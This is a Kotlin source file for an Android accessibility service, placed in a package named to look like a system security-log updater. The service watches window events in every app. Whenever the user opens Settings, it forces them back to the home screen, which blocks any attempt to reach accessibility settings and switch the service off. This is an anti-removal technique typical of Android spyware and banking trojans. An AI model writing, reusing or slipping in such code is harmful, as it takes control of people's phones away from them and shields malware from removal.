package com.android.seclogupd.accessibility

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.util.Log
import android.view.accessibility.AccessibilityEvent

class LoggerAccessibilityService : AccessibilityService() {

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            packageNames = null // همه اپ‌ها
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 100
        }
        serviceInfo = info
        Log.d("LoggerService", "AccessibilityService فعال شد")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null || event.packageName == null) return

        val packageName = event.packageName.toString()
        val className = event.className?.toString() ?: ""

        // تشخیص تلاش برای ورود به تنظیمات دسترسی
        if (
            packageName.contains("settings", true) &&
            className.contains("Settings", true)
        ) {
            Log.w("LoggerService", "کاربر وارد تنظیمات دسترسی شد")

            // جلوگیری از ادامه فعالیت (بستن یا برگشت)
            val intent = Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_HOME)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(intent)
        }
    }

    override fun onInterrupt() {
        Log.d("LoggerService", "AccessibilityService قطع شد")
    }
}

